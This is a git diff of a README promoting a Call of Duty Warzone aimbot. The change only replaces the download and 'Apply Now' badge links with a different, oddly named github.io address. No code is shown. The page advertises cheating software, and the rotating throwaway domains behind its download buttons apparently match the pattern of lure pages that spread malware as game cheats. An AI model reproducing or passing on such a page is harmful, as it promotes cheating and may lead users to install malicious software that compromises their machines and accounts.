@@ -1,7 +1,7 @@
 # 🎯 Call of Duty Warzone Aimbot — Precision Aim Tweak
 
-[![Download Aimbot Tool](https://img.shields.io/badge/Download_Aimbot_Tool-darkgreen?style=for-the-badge)](https://1cod1warzonepcassist2.github.io/.github/)  
-[![Apply Now](https://img.shields.io/badge/Apply_Now-limegreen?style=for-the-badge&logo=callofduty)](https://1cod1warzonepcassist2.github.io/.github/)
+[![Download Aimbot Tool](https://img.shields.io/badge/Download_Aimbot_Tool-darkgreen?style=for-the-badge)](https://cod-warzone-aimass1st4pc.github.io/.github/)  
+[![Apply Now](https://img.shields.io/badge/Apply_Now-limegreen?style=for-the-badge&logo=callofduty)](https://cod-warzone-aimass1st4pc.github.io/.github/)
 
 ---
 
